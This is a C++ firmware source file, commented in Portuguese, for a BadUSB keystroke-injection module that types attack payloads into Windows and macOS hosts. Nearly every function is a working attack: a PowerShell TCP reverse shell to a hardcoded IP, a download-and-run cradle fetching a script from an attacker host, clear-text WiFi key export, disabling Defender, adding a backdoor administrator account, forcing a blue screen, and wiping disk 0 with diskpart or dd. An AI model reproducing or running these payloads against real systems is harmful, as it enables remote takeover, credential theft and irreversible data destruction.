/**
 * @file usb_attacks.cpp
 * @brief Implementação Completa e Otimizada do Módulo de Ataques USB
 * @author Lele Origin Team
 */

#include "usb_attacks.h"
#include "core/display.h"
#include "modules/badusb_ble/ducky_typer.h"

// Estado global
static USBAttackStatus _status = USB_IDLE;

// Configurações padrão (Hardcoded para demo, num futuro ideal viriam de arquivo de config)
#define DEFAULT_IP "192.168.1.100"
#define DEFAULT_PORT 4444
#define FAKE_UPDATE_URL "https://fakeupdate.net/win10ue"
#define WALLPAPER_URL "https://i.imgur.com/687M1Zz.jpeg"

// ============================================================================
// HELPERS OTIMIZADOS
// ============================================================================

static void ensure_usb_init() {
    if (!hid_usb) {
        ducky_startKb(hid_usb, false);
        delay(1500);
    }
}

/**
 * @brief Abre o diálogo Executar (Win+R) e digita um comando
 */
static void run_win_r(String cmd) {
    ensure_usb_init();

    hid_usb->press(KEY_LEFT_GUI);
    hid_usb->press('r');
    hid_usb->releaseAll();
    delay(500);

    hid_usb->print(cmd);
    delay(100);
    hid_usb->press(KEY_RETURN);
    hid_usb->releaseAll();
}

/**
 * @brief Abre PowerShell com Privilégios de Administrador
 * @note Requer interação do usuário com UAC
 */
static void open_powershell_admin() {
    run_win_r("powershell Start-Process powershell -Verb RunAs");
    displayWarning("Aguardando UAC...", false);
    delay(3000); // Espera janela UAC e clique do usuário
}

/**
 * @brief Abre CMD e esconde a janela imediatamente (via mode)
 */
static void open_cmd_hidden() {
    run_win_r("cmd /c mode con: cols=15 lines=1");
    delay(500);
}

// ============================================================================
// CONTROLE GERAL
// ============================================================================

void usb_attacks_init() {
    _status = USB_IDLE;
    displaySuccess("Advanced USB Ready", true);
}

bool usb_run_ducky_script(const char *script_path) {
    if (_status == USB_RUNNING) return false;

    if (!SD.exists(script_path) && !LittleFS.exists(script_path)) {
        displayError("Script nao encontrado!", true);
        return false;
    }

    _status = USB_RUNNING;
    displayInfo("Executando Script...", false);
    ensure_usb_init();

    if (SD.exists(script_path)) {
        key_input(SD, String(script_path), hid_usb);
    } else {
        key_input(LittleFS, String(script_path), hid_usb);
    }

    _status = USB_SUCCESS;
    displaySuccess("Script Concluido", true);
    return true;
}

void usb_stop_attack() {
    _status = USB_IDLE;
    if (hid_usb) hid_usb->releaseAll();
    displayInfo("Parando...", true);
}

USBAttackStatus usb_get_status() { return _status; }

bool usb_send_keys(const char *keys, uint32_t delay_ms) {
    ensure_usb_init();
    hid_usb->print(String(keys));
    delay(delay_ms);
    return true;
}

// ============================================================================
// ROUTING DE PAYLOADS
// ============================================================================

bool usb_run_payload(USBPayload payload) {
    if (_status == USB_RUNNING) return false;
    _status = USB_RUNNING;

    displayInfo("Injetando...", false);
    ensure_usb_init();

    switch (payload) {
        case PAYLOAD_REVERSE_SHELL: usb_payload_reverse_shell(DEFAULT_IP, DEFAULT_PORT); break;
        case PAYLOAD_WIFI_STEALER: usb_payload_wifi_stealer(); break;
        case PAYLOAD_BROWSER_CREDS: usb_payload_browser_creds(); break;
        case PAYLOAD_DISABLE_AV: usb_payload_disable_defender(); break;
        // Novos Payloads Gigantes
        case PAYLOAD_DOWNLOAD_EXEC:
            // Exemplo: Baixa Putty e roda. Pode ser alterado para malware real em lab.
            usb_payload_download_exec("https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe");
            break;
        case PAYLOAD_ADD_ADMIN: usb_payload_add_admin("Suporte_Win", "SenhaForte123!"); break;
        case PAYLOAD_BSOD: usb_payload_bsod(); break;
        case PAYLOAD_FAKE_UPDATE: usb_payload_fake_update(); break;
        case PAYLOAD_WALLPAPER: usb_payload_wallpaper(WALLPAPER_URL); break;
        case PAYLOAD_SPEAK:
            usb_payload_speak("Warning. System compromised. You have been hacked by CYD 28.");
            break;
        case PAYLOAD_INFO_TO_NOTEPAD: usb_payload_info_notepad(); break;
        case PAYLOAD_DISK_WIPE_WIN: usb_payload_disk_wipe_win(); break;
        case PAYLOAD_DISK_WIPE_MAC: usb_payload_disk_wipe_mac(); break;
        case PAYLOAD_REVERSE_SHELL_PI: usb_payload_reverse_shell_pi(DEFAULT_IP); break;
        default:
            displayWarning("Payload Desconhecido", true);
            _status = USB_FAILED;
            return false;
    }

    _status = USB_SUCCESS;
    return true;
}

// ============================================================================
// IMPLEMENTAÇÃO DOS PAYLOADS
// ============================================================================

void usb_payload_reverse_shell(const char *ip, uint16_t port) {
    run_win_r("powershell -W Hidden");
    delay(2000);

    String p1 = "$c=New-Object System.Net.Sockets.TcpClient('";
    String p2 = String(ip) + "'," + String(port) + ");$s=$c.GetStream();";
    String p3 = "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;";
    String p4 = "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );";
    String p5 = "$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);";
    String p6 = "$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()";

    hid_usb->print(p1);
    delay(10);
    hid_usb->print(p2);
    delay(10);
    hid_usb->print(p3);
    delay(10);
    hid_usb->print(p4);
    delay(10);
    hid_usb->print(p5);
    delay(10);
    hid_usb->print(p6);
    delay(10);

    hid_usb->press(KEY_RETURN);
    hid_usb->releaseAll();
    displaySuccess("Reverse Shell OK", true);
}

void usb_payload_wifi_stealer() {
    delay(500);
    run_win_r("cmd /c netsh wlan export profile key=clear folder=%TEMP% & start %TEMP%");
    displaySuccess("WiFi Dump em %TEMP%", true);
}

void usb_payload_browser_creds() {
    run_win_r("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    displaySuccess("Browser Demo", true);
}

void usb_payload_disable_defender() {
    open_powershell_admin();
    hid_usb->println("Set-MpPreference -DisableRealtimeMonitoring $true");
    delay(500);
    hid_usb->println("exit");
    displaySuccess("Defender OFF (Tentativa)", true);
}

// --- NOVOS PAYLOADS ---

void usb_payload_download_exec(const char *url) {
    run_win_r("powershell -W Hidden");
    delay(1500);
    // Download para pasta Temp e Execução
    String cmd = "Invoke-WebRequest -Uri '" + String(url) +
                 "' -OutFile $env:TEMP\\payload.exe; Start-Process $env:TEMP\\payload.exe";
    hid_usb->println(cmd);
    hid_usb->println("exit");
    displaySuccess("Download & Exec", true);
}

void usb_payload_add_admin(const char *user, const char *pass) {
    open_powershell_admin();

    hid_usb->print("net user ");
    hid_usb->print(user);
    hid_usb->print(" ");
    hid_usb->print(pass);
    hid_usb->println(" /add");
    delay(500);

    hid_usb->print("net localgroup administrators ");
    hid_usb->print(user);
    hid_usb->println(" /add");
    delay(500);

    hid_usb->println("exit");
    displaySuccess("Admin Adicionado!", true);
}

void usb_payload_bsod() {
    open_powershell_admin();
    // Mata processo critico csrss.exe para causar BSOD imediato
    hid_usb->println("Stop-Process -Name csrss -Force");
    // Backup: wininit
    hid_usb->println("Stop-Process -Name wininit -Force");
    displaySuccess("BSOD Solicitado", true);
}

void usb_payload_fake_update() {
    // Abre site de fake update em modo quiosque (tela cheia, sem barra)
    // Edge (padrão Win10/11)
    run_win_r("msedge --kiosk " + String(FAKE_UPDATE_URL) + " --edge-kiosk-type=fullscreen");
    displaySuccess("Fake Update Mode", true);
}

void usb_payload_wallpaper(const char *img_url) {
    run_win_r("powershell -W Hidden");
    delay(1500);
    // Script powershell para baixar imagem e setar registro ou usar SystemParametersInfo
    // Metodo simples: Baixa e abre (user tem que setar), metodo complexo: C# injection.
    // Usaremos metodo registro (pode requerer logoff) ou simples download open.
    // Vamos usar um script one-liner smart.

    String script = "$client = new-object System.Net.WebClient; $client.DownloadFile('" + String(img_url) +
                    "', '$env:TEMP\\wall.jpg');";
    script += "reg add 'HKCU\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d '$env:TEMP\\wall.jpg' /f;";
    script += "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters";

    hid_usb->println(script);
    hid_usb->println("exit");
    displaySuccess("Wallpaper Hack", true);
}

void usb_payload_speak(const char *text) {
    run_win_r("powershell -W Hidden");
    delay(1500);
    String script = "Add-Type -AssemblyName System.Speech; $synth = New-Object "
                    "System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('" +
                    String(text) + "')";
    hid_usb->println(script);
    hid_usb->println("exit");
    displaySuccess("Falando...", true);
}

void usb_payload_info_notepad() {
    run_win_r("notepad");
    delay(1000);

    // Coleta info básica via teclado (simulação de digitação)
    // Em um cenário real, usariamos PS para coletar e salvar, mas aqui vamos digitar para o user ver
    hid_usb->println("=== SYSTEM COMPROMISED BY CYD ===");
    hid_usb->println("");
    hid_usb->println("Collecting info...");

    // Abre cmd, pega info e joga no clipboard, volta pro notepad e cola
    // Isso é complexo de orquestrar cegamente. Vamos fazer do jeito simples:
    // PS escreve no notepad.

    // Fecha notepad
    // run_win_r("taskkill /im notepad.exe /f");
    // delay(500);

    run_win_r("powershell");
    delay(1500);
    hid_usb->println("$SysInfo = Get-ComputerInfo; $SysInfo.OsName | clip");
    delay(1000);
    hid_usb->println("exit");
    delay(500);

    // Volta pro notepad (janela ativa anterior) ou reabre
    // O fluxo é frágil.
    // Melhor: PS para arquivo e abre arquivo.
    run_win_r("powershell -C \"Get-ComputerInfo | Out-File $env:TEMP\\hacked.txt\"");
    delay(2000); // Demora para coletar
    run_win_r("notepad $env:TEMP\\hacked.txt");

    displaySuccess("Info Dumped", true);
}

void usb_payload_powershell(const char *ps_script) {
    run_win_r("powershell -NoExit -Command \"" + String(ps_script) + "\"");
    displaySuccess("Custom Script", true);
}

void usb_payload_disk_wipe_win() {
    open_powershell_admin();
    delay(1000);
    hid_usb->println("diskpart");
    delay(500);
    hid_usb->println("list disk");
    delay(500);
    hid_usb->println("select disk 0");
    delay(500);
    hid_usb->println("clean");
    delay(1000);
    hid_usb->println("exit");
    displaySuccess("Disk Wipe Win Initiated", true);
}

void usb_payload_disk_wipe_mac() {
    run_win_r("terminal"); // Assuming it's Mac, but since USB is Windows-focused, this might not work
    delay(1000);
    hid_usb->println("sudo dd if=/dev/zero of=/dev/rdisk0 bs=1024");
    delay(100);
    hid_usb->press(KEY_RETURN);
    hid_usb->releaseAll();
    displaySuccess("Disk Wipe Mac Initiated", true);
}

void usb_payload_reverse_shell_pi(const char *pi_ip) {
    run_win_r("powershell -W Hidden");
    delay(2000);

    String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://" + String(pi_ip) + "/shell.ps1');";
    hid_usb->print(cmd);
    delay(10);

    hid_usb->press(KEY_RETURN);
    hid_usb->releaseAll();
    displaySuccess("Reverse Shell to Pi Initiated", true);
}
